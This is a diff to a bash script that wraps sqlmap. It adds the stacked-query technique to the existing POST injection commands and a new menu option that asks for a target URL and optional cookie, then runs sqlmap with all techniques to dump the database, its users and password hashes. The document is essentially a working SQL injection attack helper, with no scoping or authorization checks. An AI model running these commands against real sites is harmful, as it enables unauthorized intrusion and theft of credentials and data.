@@ -74,15 +74,29 @@ if [ "$cookiein4" -eq 1 ] && [ "$verbosein4" -eq 1 ]
 then
 read -p "Cookie: " cookie4
 read -p "Verbosity Level: " verbose4
-sqlmap -u "$url" --method=POST --cookie="$cookie4" --data="$data4" -p="$p4" -v=$verbose4 --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+sqlmap -u "$url" --method=POST --cookie="$cookie4" --data="$data4" -p="$p4" -v=$verbose4 --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4" --technique=S
 elif [ "$cookiein4" -eq 1 ]
 then
-sqlmap -u "$url" --method=POST --cookie="$cookie4" --data="$data4" -p "$p4" --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+sqlmap -u "$url" --method=POST --cookie="$cookie4" --data="$data4" -p "$p4" --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4" --technique=S
 elif [ "$verbosein4" -eq 1 ]
 then
-sqlmap -u="$url" --method=POST --data="$data4" -p="$p4" -v="$verbose4" --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+sqlmap -u="$url" --method=POST --data="$data4" -p="$p4" -v="$verbose4" --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4" --technique=S
 else
-sqlmap -u="$url"  --method=POST --data="$data4" -p="$p4"  --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+sqlmap -u="$url"  --method=POST --data="$data4" -p="$p4"  --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4" --technique=S
+fi
+}
+function timeBased() {
+printf "Time-Based Blind Technique \n\n"
+read -p "Do you have a cookie?(y=1/n=0): " cookiein5
+read -p "Url: " url5
+read -p "Risk level: " risk5
+read -p "Level: " level5
+if [ "$cookiein5" -eq 1 ]
+then
+read -p "Cookie: " cookie5
+sqlmap -u "$url5" --cookie="$cookie5" --dump --users --passwords --risk=$risk5 --level=$level5 --technique=BEUSTQ  
+else
+sqlmap -u "$url5"  --dump --users --passwords --risk=$risk5 --level=$level5 --technique=BEUSTQ  
 fi
 }
 function choices() {
@@ -120,7 +134,7 @@ unionQueryBased
 stackedQuery
 ;;
 5)
-#TimeBased Blind
+timeBased
 ;;
 6)
 #Inline Queries
